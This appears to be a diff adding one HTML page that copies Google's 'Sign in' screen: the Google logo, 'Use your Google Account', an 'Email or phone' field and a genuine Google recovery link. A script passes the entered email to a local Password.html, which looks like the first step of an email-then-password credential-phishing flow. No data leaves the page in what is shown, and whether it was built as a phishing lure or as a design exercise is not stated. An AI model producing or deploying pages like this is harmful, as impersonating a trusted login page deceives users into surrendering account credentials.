@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  
+  <title>Login Page</title>
+  <style>
+    body {
+      font-family: Arial, product-sans;
+      background: #f0f4f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 0.1rem;
+    }
+    .input-container input {
+      width: 100%;
+      padding: 1rem 0.5rem 0.5rem 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+      outline: none;
+    }
+    .input-container label {
+      position: absolute;
+      top: -0.4rem;
+      left: 0.8rem;
+      background: white;
+      padding: 0 0.25rem;
+      font-size: 0.85rem;
+      color: #777;
+      pointer-events: none;
+    }
+    .login-container {
+      background: white;
+      padding: 2rem;
+      border-radius: 30px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 900px;
+      height: 350px;
+    }
+    .login-content {
+      display: flex;
+      gap: 2rem;
+      align-items: flex-start;
+    }
+    .login-left {
+      flex: 1;
+    }
+    .login-right {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding-top: 100px;
+    }
+    h2 {
+      text-align: left;
+      margin-bottom: 1.5rem;
+      font-size: 3rem;
+      font-weight: lighter;
+    }
+    h3 {
+      text-align: left;
+      margin-bottom: 1.5rem;
+      font-size: 1rem;
+      font-weight: 100;
+    }
+    button {
+      padding: 0.4rem 1rem;
+      background: #1060e2;
+      color: white;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      font-size: 1rem;
+      width: auto;
+    }
+    button:hover {
+      background: #1256c5;
+    }
+    .forgot-email {
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+      align-self: flex-start;
+    }
+    .forgot-email a {
+      color: #1060e2;
+      text-decoration: none;
+    }
+    .forgot-email a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-content">
+      <div class="login-left">
+        <img src="Google__G__logo.svg.png" width="45" height="45" />
+        <h2>Sign in</h2>
+        <h3 id="subtext">Use your Google Account</h3>
+      </div>
+      <div class="login-right">
+        <form id="login-form" onsubmit="handleEmailSubmit(event)">
+          <div class="input-container">
+            <input type="text" name="username" id="username" required />
+            <label for="username">Email or phone</label>
+          </div>
+          <div class="forgot-email">
+            <a href="https://accounts.google.com/signin/v2/usernamerecovery">Forgot email?</a>
+          </div>
+          <button type="submit">Next</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function handleEmailSubmit(e) {
+      e.preventDefault();
+      const email = document.getElementById('username').value.trim();
+      if (email) {
+        window.location.href = `Password.html?email=${encodeURIComponent(email)}`;
+      }
+    }
+  </script>
+</body>
+</html>
